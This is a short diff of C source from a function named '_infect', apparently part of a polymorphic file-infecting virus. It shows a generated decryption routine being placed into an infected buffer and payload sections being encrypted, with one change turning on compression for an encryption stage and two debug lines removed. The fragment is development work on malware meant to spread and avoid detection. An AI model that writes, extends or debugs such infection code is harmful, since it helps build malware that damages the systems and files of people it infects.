@@ -117,14 +117,13 @@ static int _infect(char **s, size_t *n, struct s_infect_params p, struct s_opt o
 
 	void *route = (void*)(*s + pos + p.decrypt_routine_off);
 	//void *xx = ft_malloc(1024);
-	debug_ext("DECR", p.decrypt_routine_off, "\n");
 	poly_generate(&p.encrypt_routine, &route);
 	//---------- z2 (encryption without compression) -------------
 	compressed = FALSE;
 	if (encrypt(((*s) + pos + p.cmpr_off), p.cmpr_len, (uint32_t*)key, &compressed, p.encrypt_routine) == -1)
 		return FALSE;
 	//---------- z3 (encryption with compression) ----------------
-	compressed = FALSE;
+	compressed = TRUE;
 	int64_t changed = encrypt(((*s) + pos + p.crypt_off), p.crypt_len, (uint32_t*)key, &compressed, p.encrypt_routine);
 	if (changed == -1)
 		return FALSE;
@@ -141,7 +140,6 @@ static int _infect(char **s, size_t *n, struct s_infect_params p, struct s_opt o
 	ffree(olds2, oldn2);
 	if (olds)
 		ffree(olds, oldn);
-	//fput("/tmp/DEBUG_TEMPLATE", *s, p.bn);
 	return TRUE;
 }
 
